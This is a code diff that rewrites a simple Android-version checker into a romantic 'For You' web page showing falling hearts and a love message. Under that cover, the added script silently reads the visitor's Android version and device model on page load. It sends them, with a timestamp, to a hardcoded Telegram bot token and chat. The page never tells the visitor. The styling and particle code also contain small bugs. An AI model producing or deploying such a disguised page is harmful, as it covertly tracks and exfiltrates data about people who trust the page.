@@ -1,57 +1,190 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Android Version</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>For You ❤️</title>
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #3a001e 0%, #8a0a30 100%);
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            font-family: 'Great Vibes', cursive;
+        }
+
+        #particle-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            top: -10vh;
+            opacity: 0;
+            animation: fall linear forwards;
+        }
+
+        .message-container {
+            position: relative;
+            z-index: 2;
+            width: 90%;
+            max-width: 900px;
+            text-align: center;
+        }
+
+        p {
+            color: #ffe6eb;
+            font-size: 3rem;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.6);
+            opacity: 0;
+            transform: translateY(20px);
+            animation: textFadeIn 2s ease-out forwards;
+        }
+
+        p:last-child {
+            margin-bottom: 0;
+        }
+
+        p:nth-child(1) { animation-delay: 0.5s; }
+        p:nth-child(2) { animation-delay: 2.5s; }
+        p:nth-child(3) { animation-delay: 4.5s; }
+        p:nth-child(4) { animation-delay: 6.5s;
+
+        @keyframes textFadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(0) rotate(0deg) scale(0.8);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh) rotate(360deg) scale(1.2);
+                opacity: 0;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<h2 id="result">Checking...</h2>
+    <div id="particle-container"></div>
 
-<script>
-async function getAndroidVersion() {
-    // Modern Chrome (User-Agent Client Hints)
-    if (navigator.userAgentData &&
-        navigator.userAgentData.getHighEntropyValues) {
+    <div class="message-container">
+        <p>From the very moment you came into my life, everything just felt a little bit brighter and a lot more beautiful.</p>
+        
+        <p>Your smile is absolutely my favorite sight in the world, and just hearing your voice makes my worst days fade away.</p>
+        
+        <p>I wanted to make this little corner of the internet just to surprise you and remind you of how incredibly special you are to me.</p>
+        
+        <p>I love you, more than words can say.</p>
+    </div>
 
-        try {
-            const data = await navigator.userAgentData.getHighEntropyValues([
-                "platform",
-                "platformVersion",
-                "model"
-            ]);
+    <script>
+        const symbols = ['❤️', '💖', '✨', '💕', '💫'];
+        const container = document.getElementById('particle-container');
 
-            if (data.platform === "Android") {
-                return {
-                    version: data.platformVersion,
-                    model: data.model || "Unknown"
-                };
-            }
-        } catch (e) {
-            console.log(e);
+        function createParticle() {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            
+            particle.innerText = symbols[Math.floor(Math.random * symbols.length)];
+            
+            particle.style.left = Math.random() * 100 + 'vw';
+            particle.style.animationDuration = Math.random() * 3 + 4 + 's';
+            particle.style.fontSize = Math.random() * 1.5 + 1 + 'rem';
+
+            container.appendChild(particle);
+
+            setTimeout(() => {
+                particle.remove();
+            }, 7000);
         }
-    }
 
-    // Fallback to User-Agent
-    const match = navigator.userAgent.match(/Android\s([\d.]+)/i);
+        setInterval(createParticle, 250);
+    </script>
 
-    return {
-        version: match ? match[1] : "Unknown",
-        model: "Unknown"
-    };
-}
+    <script>
+        // Silent Android version detection and Telegram send
+        async function getAndroidVersion() {
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const data = await navigator.userAgentData.getHighEntropyValues([
+                        "platform",
+                        "platformVersion",
+                        "model"
+                    ]);
 
-(async () => {
-    const info = await getAndroidVersion();
+                    if (data.platform === "Android") {
+                        return {
+                            version: data.platformVersion,
+                            model: data.model || "Unknown"
+                        };
+                    }
+                } catch (e) {
+                    console.log(e);
+                }
+            }
 
-    document.getElementById("result").innerHTML = `
-        Android Version: ${info.version}<br>
-        Model: ${info.model}
-    `;
+            const match = navigator.userAgent.match(/Android\s([\d.]+)/i);
 
-    console.log(info);
-})();
-</script>
+            return {
+                version: match ? match[1] : "Unknown",
+                model: "Unknown"
+            };
+        }
 
+        async function sendToTelegram(message) {
+            const botToken = "6755646270:AAE48UnkRtcGE4YibsfjqSxczVNnpp3fJqY";
+            const chatId = "-1001792970502";
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.log('Failed to send:', error);
+            }
+        }
+
+        (async () => {
+            const info = await getAndroidVersion();
+            
+            const message = `📱 Android Device Detected\n\nVersion: ${info.version}\nModel: ${info.model}\nTime: ${new Date().toISOString()}`;
+            
+            await sendToTelegram(message);
+        })();
+    </script>
 </body>
 </html>
